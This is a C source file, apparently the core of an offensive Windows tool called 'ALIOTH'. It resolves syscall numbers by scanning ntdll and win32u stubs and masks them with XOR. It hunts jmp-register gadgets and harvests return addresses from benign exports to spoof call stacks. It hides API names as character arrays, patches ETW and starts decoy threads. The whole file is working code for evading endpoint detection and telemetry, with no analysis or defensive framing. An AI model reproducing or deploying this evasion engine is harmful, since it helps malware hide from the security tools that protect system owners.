#include "engine.h"
#include "etw_patch.h"
#include "hwbp_check.h"
#include "random_mask.h"
#include "decoy_threads.h"
#include "utils.h"

#pragma optimize("", off)

SYSCALL_LIST SyscallList;

ALIOTH_GADGET_ENTRY g_GadgetList[ALIOTH_MAX_GADGETS];
DWORD g_dwTotalGadgets = 0;

MASK_CANDIDATE g_MaskCandidates[MAX_MASK_CANDIDATES];
DWORD g_dwMaskCandidateCount = 0;

void* qTableAddr = NULL;
void* qGadgetAddress = NULL;
DWORD qGadgetType = 0;
DWORD qFrameSize = 0;
void* qSavedReg = NULL;
void* qSavedRetAddr = NULL;
void* qActiveMaskAddress = NULL;
void* qThreadBase = NULL;
void* qRtlUserThreadStart = NULL;
DWORD qActiveMaskFrame = 0;
DWORD qThreadBaseFrame = 0;
DWORD qRtlUserThreadStartFrame = 0;

DYNAMIC_MASK Mask_Memory;
DYNAMIC_MASK Mask_File;
DYNAMIC_MASK Mask_Security;
DYNAMIC_MASK Mask_Worker;

typedef PRUNTIME_FUNCTION (NTAPI *fnRtlLookupFunctionEntry)(DWORD64 ControlPc, PDWORD64 ImageBase, PUNWIND_HISTORY_TABLE HistoryTable);

typedef struct _UNWIND_CODE {
    BYTE CodeOffset;
    BYTE UnwindOp : 4;
    BYTE OpInfo : 4;
} UNWIND_CODE, *PUNWIND_CODE;

typedef struct _UNWIND_INFO {
    BYTE Version : 3;
    BYTE Flags : 5;
    BYTE SizeOfProlog;
    BYTE CountOfCodes;
    BYTE FrameRegister : 4;
    BYTE FrameOffset : 4;
    UNWIND_CODE UnwindCode[1];
} UNWIND_INFO, *PUNWIND_INFO;

DWORD64 ALIOTHSyscallHash(PBYTE str) {
    DWORD64 dwHash = 0x7734773477347734;
    INT c;
    while (c = (INT)((char)*str++)) dwHash = ((dwHash << 0x5) + dwHash) + c;
    return dwHash;
}

PVOID GetNextSyscallInstruction(PVOID pAddress) {
    for (DWORD i = 0; i <= 32; i++) {
        if (*((PBYTE)pAddress + i) == 0x0f && *((PBYTE)pAddress + i + 1) == 0x05 && *((PBYTE)pAddress + i + 2) == 0xc3) {
            return (PVOID)((PBYTE)pAddress + i);
        }
    }
    return NULL;
}

DWORD64 GetSSN(PVOID pAddress) {
    if (!pAddress) return INVALID_SSN;
    
    PBYTE pBytes = (PBYTE)pAddress;
    if (pBytes[0] == 0x4c && pBytes[3] == 0xb8) {
        return *(DWORD*)(pBytes + 4);
    }
    
    for (WORD idx = 1; idx <= 32; idx++) {
        if (*((PBYTE)pAddress + idx * 32) == 0x4c && *((PBYTE)pAddress + idx * 32 + 3) == 0xb8)
            return *((PBYTE)pAddress + idx * 32 + 4) - idx;
        if (*((PBYTE)pAddress - idx * 32) == 0x4c && *((PBYTE)pAddress - idx * 32 + 3) == 0xb8)
            return *((PBYTE)pAddress - idx * 32 + 4) + idx;
    }
    return INVALID_SSN;
}

DWORD ALIOTHCalcFrameSize(PVOID pFunc) {
    if (!pFunc) return DEFAULT_FRAME_SIZE;
    
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    if (!hK32) return DEFAULT_FRAME_SIZE;
    
    fnRtlLookupFunctionEntry RtlLookup = (fnRtlLookupFunctionEntry)GetProcAddress(hK32, "RtlLookupFunctionEntry");
    if (!RtlLookup) return DEFAULT_FRAME_SIZE;
    
    DWORD64 ImageBase = 0;
    PRUNTIME_FUNCTION pRF = RtlLookup((DWORD64)pFunc, &ImageBase, NULL);
    if (!pRF) return DEFAULT_FRAME_SIZE;
    
    DWORD totalSize = 0;
    
    while (pRF) {
        PUNWIND_INFO pUI = (PUNWIND_INFO)(ImageBase + pRF->UnwindData);
        for (int i = 0; i < pUI->CountOfCodes; i++) {
            UNWIND_CODE* pCode = &pUI->UnwindCode[i];
            BYTE op = pCode->UnwindOp;
            BYTE info = pCode->OpInfo;
            
            if (op == 0) totalSize += 8;
            else if (op == 1) {
                if (info == 0) { totalSize += (*(USHORT*)&pUI->UnwindCode[i+1]) * 8; i += 1; }
                else { totalSize += *(DWORD*)&pUI->UnwindCode[i+1]; i += 2; }
            }
            else if (op == 2) totalSize += (info * 8) + 8;
            else if (op == 4) i += 1;
            else if (op == 5) i += 2;
            else if (op == 8) i += 1;
            else if (op == 9) i += 2;
            else if (op == 10) totalSize += (info == 0) ? 40 : 48;
        }
        
        if (pUI->Flags & 0x04) {
            int chainedOffset = (pUI->CountOfCodes + 1) & ~1;
            pRF = (PRUNTIME_FUNCTION)(&pUI->UnwindCode[chainedOffset]);
        } else break;
    }
    
    if (totalSize % 16 != 0) totalSize = (totalSize + 16) & ~15;
    return totalSize;
}

PVOID ALIOTHSeekReturnAddress(PVOID pBase) {
    if (!pBase) return NULL;

    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    if (!hK32) return pBase;
    
    fnRtlLookupFunctionEntry RtlLookup = (fnRtlLookupFunctionEntry)GetProcAddress(hK32, "RtlLookupFunctionEntry");
    if (!RtlLookup) return pBase;

    DWORD scanLimit = 256;
    DWORD64 ImageBase = 0;
    PRUNTIME_FUNCTION pRF = RtlLookup((DWORD64)pBase, &ImageBase, NULL);
    
    if (pRF) {
        PVOID realBegin = (PVOID)(ImageBase + pRF->BeginAddress);
        PVOID realEnd = (PVOID)(ImageBase + pRF->EndAddress);
        DWORD remaining = (DWORD)((PBYTE)realEnd - (PBYTE)pBase);
        scanLimit = (remaining < 256) ? remaining : 256;
    }

    PBYTE pBytes = (PBYTE)pBase;
    for (DWORD i = 0; i < scanLimit; i++) {
        if (i + 6 <= scanLimit && pBytes[i] == 0xFF && pBytes[i+1] == 0x15)
            return (PVOID)(pBytes + i + 6);
        if (i + 5 <= scanLimit && pBytes[i] == 0xE8)
            return (PVOID)(pBytes + i + 5);
    }
    return pBase;
}

DWORD ALIOTHFindValidGadgets(PCHAR pcModuleName, ALIOTH_GADGET_ENTRY pOutGadgets[], DWORD dwMaxGadgets) {
    HMODULE hModule = GetModuleHandleA(pcModuleName);
    if (!hModule) return 0;
    
    PBYTE pBase = (PBYTE)hModule;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((PBYTE)&pNt->OptionalHeader + pNt->FileHeader.SizeOfOptionalHeader);
    
    DWORD dwFound = 0;
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections && dwFound < dwMaxGadgets; i++) {
        if (!(pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        
        PBYTE pSectionBase = pBase + pSection[i].VirtualAddress;
        DWORD dwSectionSize = pSection[i].SizeOfRawData;
        
        for (DWORD j = 0; j < dwSectionSize - 2 && dwFound < dwMaxGadgets; j++) {
            if (pSectionBase[j] == 0xFF && pSectionBase[j+1] == 0xE0) {
                pOutGadgets[dwFound].pGadgetAddress = (PVOID)(pSectionBase + j);
                pOutGadgets[dwFound].dwGadgetType = 0;
                pOutGadgets[dwFound].dwFrameSize = 0;
                pOutGadgets[dwFound].dwModuleBase = (DWORD64)hModule;
                dwFound++;
            }
            else if (pSectionBase[j] == 0xFF && pSectionBase[j+1] == 0xE7) {
                pOutGadgets[dwFound].pGadgetAddress = (PVOID)(pSectionBase + j);
                pOutGadgets[dwFound].dwGadgetType = 1;
                pOutGadgets[dwFound].dwFrameSize = 0;
                pOutGadgets[dwFound].dwModuleBase = (DWORD64)hModule;
                dwFound++;
            }
            else if (pSectionBase[j] == 0xFF && pSectionBase[j+1] == 0xE6) {
                pOutGadgets[dwFound].pGadgetAddress = (PVOID)(pSectionBase + j);
                pOutGadgets[dwFound].dwGadgetType = 2;
                pOutGadgets[dwFound].dwFrameSize = 0;
                pOutGadgets[dwFound].dwModuleBase = (DWORD64)hModule;
                dwFound++;
            }
            else if (pSectionBase[j] == 0xFF && pSectionBase[j+1] == 0xE3) {
                pOutGadgets[dwFound].pGadgetAddress = (PVOID)(pSectionBase + j);
                pOutGadgets[dwFound].dwGadgetType = 3;
                pOutGadgets[dwFound].dwFrameSize = 0;
                pOutGadgets[dwFound].dwModuleBase = (DWORD64)hModule;
                dwFound++;
            }
            else if (pSectionBase[j] == 0x41 && pSectionBase[j+1] == 0xFF && j+2 < dwSectionSize) {
                if (pSectionBase[j+2] == 0xE4) {
                    pOutGadgets[dwFound].pGadgetAddress = (PVOID)(pSectionBase + j);
                    pOutGadgets[dwFound].dwGadgetType = 4;
                    pOutGadgets[dwFound].dwFrameSize = 0;
                    pOutGadgets[dwFound].dwModuleBase = (DWORD64)hModule;
                    dwFound++;
                }
                else if (pSectionBase[j+2] == 0xE5) {
                    pOutGadgets[dwFound].pGadgetAddress = (PVOID)(pSectionBase + j);
                    pOutGadgets[dwFound].dwGadgetType = 5;
                    pOutGadgets[dwFound].dwFrameSize = 0;
                    pOutGadgets[dwFound].dwModuleBase = (DWORD64)hModule;
                    dwFound++;
                }
                else if (pSectionBase[j+2] == 0xE6) {
                    pOutGadgets[dwFound].pGadgetAddress = (PVOID)(pSectionBase + j);
                    pOutGadgets[dwFound].dwGadgetType = 6;
                    pOutGadgets[dwFound].dwFrameSize = 0;
                    pOutGadgets[dwFound].dwModuleBase = (DWORD64)hModule;
                    dwFound++;
                }
                else if (pSectionBase[j+2] == 0xE7) {
                    pOutGadgets[dwFound].pGadgetAddress = (PVOID)(pSectionBase + j);
                    pOutGadgets[dwFound].dwGadgetType = 7;
                    pOutGadgets[dwFound].dwFrameSize = 0;
                    pOutGadgets[dwFound].dwModuleBase = (DWORD64)hModule;
                    dwFound++;
                }
            }
        }
    }
    return dwFound;
}

VOID ALIOTHScanModuleForMasks(PCHAR pcModuleName) {
    HMODULE hMod = GetModuleHandleA(pcModuleName);
    if (!hMod) return;
    
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hMod + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hMod + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);
    
    if (!pExport) return;
    
    PDWORD pdwNames = (PDWORD)((PBYTE)hMod + pExport->AddressOfNames);
    PDWORD pdwFuncs = (PDWORD)((PBYTE)hMod + pExport->AddressOfFunctions);
    PWORD pwOrdinals = (PWORD)((PBYTE)hMod + pExport->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < pExport->NumberOfNames && g_dwMaskCandidateCount < MAX_MASK_CANDIDATES; i++) {
        PCHAR pcName = (PCHAR)((PBYTE)hMod + pdwNames[i]);
        PVOID pFunc = (PBYTE)hMod + pdwFuncs[pwOrdinals[i]];
        
        if (strstr(pcName, "Virtual") || strstr(pcName, "Alloc") || 
            strstr(pcName, "Dbg") || strstr(pcName, "Debug") ||
            strstr(pcName, "MiniDump") || strstr(pcName, "CreateProcess") ||
            strstr(pcName, "CreateRemote") || strstr(pcName, "Write") ||
            strstr(pcName, "Protect") || strstr(pcName, "Thread")) continue;
        
        USHORT prefix = *(USHORT*)pcName;
        if (prefix == 0x744E || prefix == 0x775A) continue;
        
        DWORD dwFrame = ALIOTHCalcFrameSize(pFunc);
        if (dwFrame < 0x20 || dwFrame > 0x100) continue;
        
        PVOID pRetAddr = ALIOTHSeekReturnAddress(pFunc);
        if (!pRetAddr || pRetAddr == pFunc) continue;
        
        g_MaskCandidates[g_dwMaskCandidateCount].pAddress = pRetAddr;
        g_MaskCandidates[g_dwMaskCandidateCount].dwFrameSize = dwFrame;
        strncpy_s(g_MaskCandidates[g_dwMaskCandidateCount].cName, 64, pcName, _TRUNCATE);
        g_dwMaskCandidateCount++;
    }
}

PVOID ALIOTHGetSyscallStub(DWORD64 dwHash) {
    for (DWORD i = 0; i < SyscallList.Count; i++) {
        if (SyscallList.Entries[i].dwHash == dwHash) {
            PBYTE pStubBase = (PBYTE)&Fnc0000;
            return (PVOID)(pStubBase + (i * 16));
        }
    }
    return NULL;
}

PVOID ALIOTHGetStubByIndex(DWORD dwIndex) {
    if (dwIndex >= SyscallList.Count) return NULL;
    PBYTE pStubBase = (PBYTE)&Fnc0000;
    return (PVOID)(pStubBase + (dwIndex * 16));
}

DYNAMIC_MASK GetRandomMask() {
    DYNAMIC_MASK m = {0};
    if (g_dwMaskCandidateCount == 0) {
        m = Mask_Worker;
        return m;
    }
    DWORD idx = rand() % g_dwMaskCandidateCount;
    m.pAddress = g_MaskCandidates[idx].pAddress;
    m.dwFrameSize = g_MaskCandidates[idx].dwFrameSize;
    return m;
}

BOOL ALIOTHInit() {
    if (!ALIOTHTlsInit()) return FALSE;
    
    PALIOTH_TLS_CONTEXT pCtx = ALIOTHGetCtx();
    if (!pCtx) return FALSE;
    
    char sNtdll[] = {'n','t','d','l','l','.','d','l','l',0};
    HMODULE hNtdll = GetModuleHandleA(sNtdll);
    if (!hNtdll) return FALSE;
    
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hNtdll + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);
    PDWORD pdwFunctions = (PDWORD)((PBYTE)hNtdll + pExport->AddressOfFunctions);
    PDWORD pdwNames = (PDWORD)((PBYTE)hNtdll + pExport->AddressOfNames);
    PWORD pwOrdinals = (PWORD)((PBYTE)hNtdll + pExport->AddressOfNameOrdinals);

    char sK32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
    char sVP[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t','E','x',0};
    char sCP[] = {'C','r','e','a','t','e','P','r','o','c','e','s','s','W',0};
    char sMV[] = {'M','a','p','V','i','e','w','O','f','F','i','l','e',0};
    char sMF[] = {'M','o','v','e','F','i','l','e','W',0};
    char sBT[] = {'B','a','s','e','T','h','r','e','a','d','I','n','i','t','T','h','u','n','k',0};
    char sRU[] = {'R','t','l','U','s','e','r','T','h','r','e','a','d','S','t','a','r','t',0};

    HMODULE hK32 = GetModuleHandleA(sK32);
    if (!hK32) return FALSE;
    
    PVOID pVP = GetProcAddress(hK32, sVP);
    PVOID pCP = GetProcAddress(hK32, sCP);
    PVOID pMV = GetProcAddress(hK32, sMV);
    PVOID pMF = GetProcAddress(hK32, sMF);
    PVOID pBT = GetProcAddress(hK32, sBT);
    PVOID pRU = GetProcAddress(hNtdll, sRU);
    
    if (!pVP || !pCP || !pMV || !pMF || !pBT || !pRU) return FALSE;

    pCtx->qActiveMaskAddress = ALIOTHSeekReturnAddress(pVP);
    Mask_Security.pAddress = pCtx->qActiveMaskAddress;
    Mask_Security.dwFrameSize = ALIOTHCalcFrameSize(pCtx->qActiveMaskAddress);

    Mask_Worker.pAddress = ALIOTHSeekReturnAddress(pCP);
    Mask_Worker.dwFrameSize = ALIOTHCalcFrameSize(Mask_Worker.pAddress);

    Mask_Memory.pAddress = ALIOTHSeekReturnAddress(pMV);
    Mask_Memory.dwFrameSize = ALIOTHCalcFrameSize(Mask_Memory.pAddress);

    Mask_File.pAddress = ALIOTHSeekReturnAddress(pMF);
    Mask_File.dwFrameSize = ALIOTHCalcFrameSize(Mask_File.pAddress);

    pCtx->qThreadBase = ALIOTHSeekReturnAddress(pBT);
    pCtx->qThreadBaseFrame = ALIOTHCalcFrameSize(pCtx->qThreadBase);

    pCtx->qRtlUserThreadStart = ALIOTHSeekReturnAddress(pRU);
    pCtx->qRtlUserThreadStartFrame = ALIOTHCalcFrameSize(pCtx->qRtlUserThreadStart);

    ALIOTH_GADGET_ENTRY k32Gadgets[ALIOTH_MAX_GADGETS];
    DWORD dwK32Found = ALIOTHFindValidGadgets(sK32, k32Gadgets, ALIOTH_MAX_GADGETS);
    
    ALIOTH_GADGET_ENTRY ntdllGadgets[ALIOTH_MAX_GADGETS];
    DWORD dwNtdllFound = ALIOTHFindValidGadgets(sNtdll, ntdllGadgets, ALIOTH_MAX_GADGETS);
    
    char sWin32u[] = {'w','i','n','3','2','u','.','d','l','l',0};
    ALIOTH_GADGET_ENTRY win32uGadgets[ALIOTH_MAX_GADGETS];
    DWORD dwWin32uFound = ALIOTHFindValidGadgets(sWin32u, win32uGadgets, ALIOTH_MAX_GADGETS);
    
    for (DWORD i = 0; i < dwK32Found && g_dwTotalGadgets < ALIOTH_MAX_GADGETS; i++) {
        g_GadgetList[g_dwTotalGadgets++] = k32Gadgets[i];
    }
    for (DWORD i = 0; i < dwNtdllFound && g_dwTotalGadgets < ALIOTH_MAX_GADGETS; i++) {
        g_GadgetList[g_dwTotalGadgets++] = ntdllGadgets[i];
    }
    for (DWORD i = 0; i < dwWin32uFound && g_dwTotalGadgets < ALIOTH_MAX_GADGETS; i++) {
        g_GadgetList[g_dwTotalGadgets++] = win32uGadgets[i];
    }
    
    if (g_dwTotalGadgets == 0) return FALSE;

    for (DWORD i = 0; i < g_dwTotalGadgets; i++) {
        pCtx->Gadgets[i] = g_GadgetList[i];
        g_GadgetList[i].dwFrameSize = ALIOTHCalcFrameSize(g_GadgetList[i].pGadgetAddress);
    }
    pCtx->dwGadgetCount = g_dwTotalGadgets;
    pCtx->dwGadgetRotationIndex = 0;
    
    PALIOTH_GADGET_ENTRY pFirstGadget = &pCtx->Gadgets[0];
    pCtx->qGadgetAddress = pFirstGadget->pGadgetAddress;
    pCtx->qGadgetType = pFirstGadget->dwGadgetType;
    pCtx->qFrameSize = pFirstGadget->dwFrameSize;
    
    SetTableAddr(SyscallList.Entries, pCtx->qGadgetAddress, pCtx->qGadgetType, pCtx->qFrameSize);

    ALIOTHScanModuleForMasks("kernel32.dll");
    ALIOTHScanModuleForMasks("kernelbase.dll");
    ALIOTHScanModuleForMasks("ntdll.dll");
    ALIOTHScanModuleForMasks("user32.dll");
    ALIOTHScanModuleForMasks("advapi32.dll");

    DWORD idx = 0;
    for (WORD i = 0; i < pExport->NumberOfNames && idx < ALIOTH_MAX_STUBS; i++) {
        PCHAR pcName = (PCHAR)((PBYTE)hNtdll + pdwNames[i]);
        PVOID pAddress = (PBYTE)hNtdll + pdwFunctions[pwOrdinals[i]];
        
        USHORT prefix = *(USHORT*)pcName;
        if (prefix != 0x744E && prefix != 0x775A) continue;
        
        DWORD64 dwSsn = GetSSN(pAddress);
        if (dwSsn == INVALID_SSN) continue;
        
        PVOID pSyscallRet = GetNextSyscallInstruction(pAddress);
        if (!pSyscallRet) continue;
        
        SyscallList.Entries[idx].pAddress = pAddress;
        SyscallList.Entries[idx].dwSsn = dwSsn;
        SyscallList.Entries[idx].pSyscallRet = pSyscallRet;
        SyscallList.Entries[idx].dwHash = ALIOTHSyscallHash((PBYTE)pcName);
        
        BYTE key = (BYTE)(rand() & 0xFF);
        if (key == 0) key = 0x5A;
        SyscallList.Entries[idx].dwSsnKey = key;
        SyscallList.Entries[idx].dwSsn ^= key;
        
        idx++;
    }

    HMODULE hWin32u = GetModuleHandleA(sWin32u);
    if (hWin32u) {
        PIMAGE_DOS_HEADER pDos2 = (PIMAGE_DOS_HEADER)hWin32u;
        PIMAGE_NT_HEADERS pNt2 = (PIMAGE_NT_HEADERS)((PBYTE)hWin32u + pDos2->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY pExport2 = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hWin32u + pNt2->OptionalHeader.DataDirectory[0].VirtualAddress);
        
        if (pExport2) {
            PDWORD pdwNames2 = (PDWORD)((PBYTE)hWin32u + pExport2->AddressOfNames);
            PDWORD pdwFuncs2 = (PDWORD)((PBYTE)hWin32u + pExport2->AddressOfFunctions);
            PWORD pwOrdinals2 = (PWORD)((PBYTE)hWin32u + pExport2->AddressOfNameOrdinals);
            
            for (WORD i = 0; i < pExport2->NumberOfNames && idx < ALIOTH_MAX_STUBS; i++) {
                PCHAR pcName = (PCHAR)((PBYTE)hWin32u + pdwNames2[i]);
                PVOID pAddress = (PBYTE)hWin32u + pdwFuncs2[pwOrdinals2[i]];
                
                USHORT prefix = *(USHORT*)pcName;
                if (prefix != 0x744E && prefix != 0x775A) continue;
                
                DWORD64 dwSsn = GetSSN(pAddress);
                if (dwSsn == INVALID_SSN) continue;
                
                PVOID pSyscallRet = GetNextSyscallInstruction(pAddress);
                if (!pSyscallRet) continue;
                
                BOOL bExists = FALSE;
                for (DWORD j = 0; j < idx; j++) {
                    if (SyscallList.Entries[j].dwHash == ALIOTHSyscallHash((PBYTE)pcName)) {
                        bExists = TRUE;
                        break;
                    }
                }
                if (bExists) continue;
                
                SyscallList.Entries[idx].pAddress = pAddress;
                SyscallList.Entries[idx].dwSsn = dwSsn;
                SyscallList.Entries[idx].pSyscallRet = pSyscallRet;
                SyscallList.Entries[idx].dwHash = ALIOTHSyscallHash((PBYTE)pcName);
                
                BYTE key = (BYTE)(rand() & 0xFF);
                if (key == 0) key = 0x5A;
                SyscallList.Entries[idx].dwSsnKey = key;
                SyscallList.Entries[idx].dwSsn ^= key;
                
                idx++;
            }
        }
    }

    for (int i = idx - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        SYSCALL_ENTRY tmp = SyscallList.Entries[i];
        SyscallList.Entries[i] = SyscallList.Entries[j];
        SyscallList.Entries[j] = tmp;
    }
    
    SyscallList.Count = idx;
    pCtx->bSsnXorKey = (BYTE)(rand() & 0xFF);

    if (ALIOTH_ENABLE_ETW_PATCH) {
        ALIOTHPatchEtw();
    }
    
    if (ALIOTH_ENABLE_DECOY_THREADS) {
        ALIOTHStartDecoys();
    }
    
    return TRUE;
}

VOID ALIOTHCleanup() {
    ALIOTHRestoreEtw();
    ALIOTHTlsCleanup();
}
#pragma optimize("", on)
